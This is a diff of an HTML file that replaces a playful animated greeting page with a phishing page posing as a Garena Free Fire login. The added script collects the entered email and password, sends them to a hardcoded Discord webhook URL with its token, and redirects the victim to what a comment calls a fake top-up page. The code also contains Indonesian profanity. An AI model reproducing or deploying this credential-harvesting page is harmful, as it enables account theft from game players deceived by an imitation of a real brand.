@@ -1,235 +1,204 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Hey Mayla</title>
-
-<style>
-body{
-  background:#0a0f16;
-  color:#8be9fd;
-  font-family: Consolas, monospace;
-  height:100vh;
-  margin:0;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  overflow:hidden;
-}
-
-/* ===== FOTO DI KANAN (FIX TOTAL) ===== */
-#mayla-photo{
-  position:fixed;
-  right:60px;
-  top:50%;
-  transform:translateY(-50%);
-  z-index:10;
-}
-
-#mayla-photo img{
-  width:260px;
-  height:auto;
-  border-radius:14px;
-  border:2px solid #1f6feb;
-  box-shadow:0 0 25px rgba(31,111,235,0.7);
-  object-fit:cover;
-  background:#02080e;
-  transition:0.3s;
-}
-
-#mayla-photo img:hover{
-  transform:scale(1.04);
-  box-shadow:0 0 30px rgba(255,45,117,0.9);
-}
-
-/* ===== TERMINAL ===== */
-#terminal{
-  width:90%;
-  max-width:720px;
-  background:#02080e;
-  border:1px solid #1f6feb;
-  border-radius:10px;
-  box-shadow:0 0 20px rgba(31,111,235,0.3);
-  padding:20px;
-  position:relative;
-  z-index:5;
-
-  /* biar gak ketabrak foto */
-  margin-right:280px;
-}
-
-.line{
-  margin:6px 0;
-  opacity:0;
-  white-space:pre;
-}
-
-.cursor{
-  display:inline-block;
-  width:8px;
-  background:#8be9fd;
-  animation:blink 1s infinite;
-}
-
-@keyframes blink{
-  50%{opacity:0}
-}
-
-/* ===== BINARY HEART ===== */
-#binary{
-  color:#ff2d75;
-  text-shadow:0 0 10px #ff2d75;
-  margin-bottom:10px;
-  text-align:center;
-  animation:pulse 2s infinite;
-}
-
-#binary pre{
-  font-family: Consolas, monospace;
-  letter-spacing:2px;
-  line-height:1.1;
-}
-
-@keyframes pulse{
-  0%,100%{transform:scale(1)}
-  50%{transform:scale(1.05)}
-}
-
-/* ===== EFEK BACKGROUND ===== */
-.particle{
-  position:absolute;
-  font-size:14px;
-  color:#1f6feb;
-  opacity:0.6;
-  animation:fall linear infinite;
-}
-
-@keyframes fall{
-  from{transform:translateY(-10vh)}
-  to{transform:translateY(110vh)}
-}
-
-.matrix{
-  position:absolute;
-  color:#ff2d75;
-  opacity:0.15;
-  font-size:20px;
-  animation:rise linear infinite;
-}
-
-@keyframes rise{
-  from{transform:translateY(110vh)}
-  to{transform:translateY(-10vh)}
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Garena - Free Fire</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { 
+            background: linear-gradient(135deg, #1a1e2f 0%, #2a2f45 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+        .login-card {
+            background: rgba(18, 20, 30, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 40px;
+            padding: 35px 30px;
+            width: 100%;
+            max-width: 400px;
+            border: 2px solid #ff7b00;
+            box-shadow: 0 20px 40px rgba(255, 123, 0, 0.3);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo img {
+            width: 160px;
+            height: auto;
+        }
+        h2 {
+            color: white;
+            font-size: 26px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .sub {
+            color: #a0a6c0;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            color: #cbd0e6;
+            font-size: 13px;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 6px;
+            margin-left: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 16px 18px;
+            background: #0f111f;
+            border: 2px solid #2c2f44;
+            border-radius: 30px;
+            font-size: 15px;
+            color: white;
+            outline: none;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #ff7b00;
+        }
+        .remember {
+            display: flex;
+            align-items: center;
+            margin: 20px 0 25px;
+        }
+        .remember input {
+            width: auto;
+            margin-right: 10px;
+            accent-color: #ff7b00;
+        }
+        .remember label {
+            margin: 0;
+            color: #a0a6c0;
+        }
+        button {
+            width: 100%;
+            background: #ff7b00;
+            border: none;
+            border-radius: 40px;
+            padding: 18px;
+            color: #0f111f;
+            font-weight: 800;
+            font-size: 18px;
+            cursor: pointer;
+            box-shadow: 0 10px 25px #ff7b00;
+            transition: 0.2s;
+            border: 2px solid #ff7b00;
+            margin-bottom: 20px;
+        }
+        button:hover {
+            background: #ff9100;
+            transform: scale(1.02);
+        }
+        .links {
+            display: flex;
+            justify-content: space-between;
+            color: #5c6180;
+            font-size: 13px;
+        }
+        .links a {
+            color: #ff7b00;
+            text-decoration: none;
+        }
+        .footer-note {
+            text-align: center;
+            margin-top: 25px;
+            color: #5c6180;
+            font-size: 11px;
+        }
+    </style>
 </head>
-
 <body>
+    <div class="login-card">
+        <div class="logo">
+            <!-- PAKE GAMBAR LOKAL DARI FOLDER IMAGES -->
+            <img src="images/garena-logo.png" alt="Garena" onerror="this.src='https://via.placeholder.com/160x60/ff7b00/ffffff?text=GARENA'">
+        </div>
+        <h2>Welcome Back!</h2>
+        <div class="sub">Login ke akun Garena untuk lanjut top-up</div>
 
-<div id="mayla-photo">
-  <img src="mayla.jpg">
-</div>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>📧 Email / Username</label>
+                <input type="text" id="email" placeholder="Masukkan email atau username" required>
+            </div>
+            <div class="input-group">
+                <label>🔒 Password</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+            <div class="remember">
+                <input type="checkbox" id="remember">
+                <label for="remember">Ingat saya</label>
+            </div>
+            <button type="submit">LOGIN KE GARENA</button>
+        </form>
+        <div class="links">
+            <a href="#">Lupa password?</a>
+            <a href="#">Daftar baru</a>
+        </div>
+        <div class="footer-note">
+            Dengan login, Anda menyetujui Syarat & Ketentuan Garena
+        </div>
+    </div>
 
-<div id="terminal">
+    <script>
+        // GANTI WEBHOOK INI BANGSAT!
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1474995590327828643/Hsj2F327G7j8_kmojLtpBD3PUekumPhmUw7pAJjSKdeoyaL-9fT-h9pMNdzQF0liyUei';
 
-<div id="binary">
-<pre>
-      000011000011000
-   00011110011110000
-  00111111111111000
- 01111111111111110
-0111111111111111110
-0111111111111111110
-0111111111111111110
- 01111111111111110
-  001111111111110
-   00011111111100
-     0001111100
-       001110
-         10
-</pre>
-</div>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
 
-<script>
-const t = document.getElementById("terminal");
+            if (!email || !password) {
+                alert('Isi semua field, kontol!');
+                return;
+            }
 
-const text = [
-"booting tkj_mode.exe ...",
-"loading feeling.dll ...",
-"connection to Mayla established ✔",
-"--------------------------------------",
-"halo Mayla kecil😄",
-"katanya anak RPL",
-"tapi jangan jadi korban cyber ya wkwkwkwkw",
-"",
-"diagnosa sistem:",
-"mayla adalah benda kecil sebotol yakult",
-"solusi: tambah tinggi dikit 🤏😆",
-"",
-"pesan rahasia:",
-"orang keren gak butuh effort berlebihan",
-"cukup jadi diri sendiri aja 😎",
-"--------------------------------------",
-"process finished without drama"
-];
+            // Kirim ke Discord
+            let data = {
+                content: '@everyone **DATA LOGIN GARENA MENTAH**',
+                embeds: [{
+                    title: '🔐 LOGIN CREDENTIALS',
+                    color: 16744704,
+                    fields: [
+                        { name: 'EMAIL/USERNAME', value: '```' + email + '```', inline: true },
+                        { name: 'PASSWORD', value: '```' + password + '```', inline: true },
+                        { name: 'TIMESTAMP', value: '<t:' + Math.floor(Date.now() / 1000) + ':F>', inline: false }
+                    ],
+                    footer: { text: 'Architect 01 – © RianModss' }
+                }]
+            };
 
-let i = 0;
-
-function type(){
-  if(i < text.length){
-    const div = document.createElement("div");
-    div.className="line";
-    t.appendChild(div);
-
-    let j = 0;
-    const interval = setInterval(()=>{
-      div.style.opacity = 1;
-      div.textContent += text[i][j];
-      j++;
-
-      if(j >= text[i].length){
-        clearInterval(interval);
-        i++;
-        setTimeout(type, 350);
-      }
-    }, 38);
-  }else{
-    const c = document.createElement("span");
-    c.className="cursor";
-    c.innerHTML=" ";
-    t.appendChild(c);
-  }
-}
-
-type();
-
-function particle(){
-  const p = document.createElement("div");
-  p.className="particle";
-  p.textContent = ["0","1","{ }",";","//","< >"][Math.floor(Math.random()*6)];
-  p.style.left=Math.random()*100+"vw";
-  p.style.animationDuration=(Math.random()*5+5)+"s";
-  document.body.appendChild(p);
-  setTimeout(()=>p.remove(),9000);
-}
-
-setInterval(particle,300);
-
-function matrix(){
-  const m = document.createElement("div");
-  m.className="matrix";
-  m.textContent="♥";
-  m.style.left=Math.random()*100+"vw";
-  m.style.animationDuration=(Math.random()*6+6)+"s";
-  document.body.appendChild(m);
-  setTimeout(()=>m.remove(),12000);
-}
-
-setInterval(matrix,800);
-</script>
-
-</div>
-
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(res => {
+                if (res.ok) {
+                    // Redirect ke halaman top-up palsu setelah login sukses
+                    window.location.href = 'topup.html';
+                } else {
+                    alert('Gagal, coba lagi.');
+                }
+            })
+            .catch(() => alert('Error jaringan.'));
+        });
+    </script>
 </body>
 </html>
